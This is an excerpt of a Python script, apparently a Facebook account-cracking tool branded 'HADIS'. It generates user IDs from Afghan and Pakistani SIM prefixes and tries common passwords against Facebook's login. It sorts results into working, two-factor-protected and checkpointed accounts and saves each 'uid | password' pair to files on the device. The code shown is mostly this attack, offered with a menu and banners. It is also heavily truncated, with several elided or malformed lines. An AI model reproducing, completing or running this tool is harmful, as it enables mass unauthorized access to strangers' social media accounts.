...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; HADIS \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
ha = current.day
today = date.today()
HADIS2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
import random
cokbrut=[]
...
\033[1;34m ┃ [✓] VERSOIN   \033[1;91m: \033[1;92m1.0
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"""
...
print("")
print(f"{BLUE} PUT YOUR NAME LIKE  HADIS")
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owner) HADIS
...
def XYZ():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════')
    print(f"\t      {WHITE}[{EXTRA} {HADIST()} {WHITE}]")
    print(f" {GREEN}PREMIUM USER          {WHITE}: {GREEN}Mr {ORANGE} {NameX}")
    print(f"{BLUE}══════════════════════════════════════════════════")
    print(f"{RED}[01] {WHITE}RANDOM CLONE ")
    print(f"{RED}[02] {WHITE}OWNER FACEBOOM")
    print(f"{RED}[03] {WHITE}TELEGRAM")
...
def pass1():
    ...
    print(f"")
    print(f' {GREEN}[!] AFG SIM CODES : {Y}9378, 9379, 9377, 9370 , 9376')
    
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR AFG 9378/ 9379/ 9377/ 9370/033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HADIS-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HADIS-CP.txt')
...
def pass2():
    ...
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f' {GREEN}[!] AFG SIM CODES : {Y}9378, 9379, 9376, 9370')
  
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR AFG 9378 / 9379 / 9376/ 9370 \033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
...
def Ulti():
    ...
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f' {GREEN}[!] AFG  SIM CODES : {Y}9379, 9378, 9370, 9374')
    print(f' {GREEN}[!]               : {T}9379, 9378, 9370')
    print(f' {GREEN}[!]               : {Q}9374, 9376, 9377, ')
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR AFG 9378/ 9379 / 9374 / 9377 /9370  \033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
...
def pass3():
    ...
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f' {GREEN}[!] AFG SIM CODES : {Y}0334, 0321, 0340, 0345')
  ...
  'cache-control': 'max-age=0',
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio HADIS_OK.mp3")
                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                cek_apk(session,coki)
                open('/sdcard/HADIS-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/HADIS-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    ...
                    open('/sdcard/HADIS-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[HADIS 🔥] [%s] \33[1;97m[OK:%s{HADIS2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
